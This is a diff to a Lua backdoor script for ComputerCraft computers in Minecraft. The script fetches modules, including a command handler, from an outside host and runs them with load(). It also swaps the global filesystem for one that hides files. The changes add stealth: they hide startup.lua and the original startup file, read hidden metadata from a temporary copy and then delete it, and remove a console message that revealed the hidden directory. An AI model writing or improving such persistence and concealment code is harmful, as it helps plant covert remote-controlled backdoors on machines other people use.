@@ -27,6 +27,8 @@ local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or 
 local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
 
+
+local metadataFile = nil
 local rstartup = utils.generateRandomString(3)
 _OGFS.copy("startup.lua",rstartup)
 local function getRealStartupPath()
@@ -73,22 +75,74 @@ local function getBDApath()
     f.close()
     return nil, nil
 end
-_OGFS.delete(rstartup)
+
+local function getMetadataFile()
+    if not _OGFS.exists(rstartup) then
+        return nil -- Return nil if the file doesn't exist
+    end
+
+    local f = _OGFS.open(rstartup, "r")
+    if not f then
+        return nil -- Safeguard against failed open
+    end
+
+    for i = 1, 10 do -- Check only the first 10 lines
+        local line = f.readLine()
+        if not line then
+            break
+        end
+
+        -- Match the format: --key^value
+        local key, value = string.match(line, "^%-%-(%S+)%^(%S+)$")
+        if key and value then
+            f.close()
+            return key, value -- Return key and value
+        end
+    end
+
+    f.close()
+    return nil -- Return nil if no matching line is found
+end
 
 local xsup=getRealStartupPath()
 local bdapath, filename = getBDApath()
+metadataFile=getMetadataFile()
+_OGFS.delete(rstartup)
 
+local function hideStartup()
+    if xsup ~= nil then
+        local handle = _OGFS.open(xsup, "r")
+        if handle then
+            local contents = handle.readAll() or ""
+            handle.close()
+    
+            if contents == "" then
+                -- Hide real startup.lua file if xsup has no contents
+                customfs.hideFile("startup.lua")
+            else
+                -- Set xsup as the original startup and hide it
+                customfs.setOriginalStartup(xsup)
+                customfs.hideFile(xsup)
+            end
+        else
+            -- If the file can't be opened, fallback to hiding the real startup.lua
+            customfs.hideFile("startup.lua")
+        end
+    else
+        -- If xsup is nil, ensure real startup.lua is hidden
+        customfs.hideFile("startup.lua")
+    end
+end
+hideStartup()
 if xsup~=nil then
     customfs.setOriginalStartup(xsup)
+    customfs.hideFile(xsup)
 end
 
 if customfs ~= nil and bdapath ~= nil then
-    _ = nil
-    print("hiding dir: "..bdapath)
+    filename = nil
     customfs.hideDir(bdapath)
-else
 end
-
 _G.fs=customfs
 uninstaller_installer.setOGFS(_OGFS)
 uninstaller_installer.setCFS(customfs)
